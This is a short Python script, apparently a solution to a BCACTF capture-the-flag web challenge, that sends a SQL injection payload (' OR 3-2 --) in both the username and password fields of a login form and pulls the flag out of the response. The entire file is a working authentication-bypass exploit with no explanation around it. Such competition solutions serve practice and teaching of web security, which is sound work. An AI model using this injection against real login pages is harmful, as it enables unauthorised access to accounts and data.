#!/usr/bin/python3

import re

import requests

url = "http://web.bcactf.com:49162/"

#print(data)

payload = {	"Username": "' OR 3-2 --",
			"Password": "' OR 3-2 --"}

r = requests.post(url, data = payload)

#print(r.text)

print(re.findall("bcactf{.*}", r.text)[0])
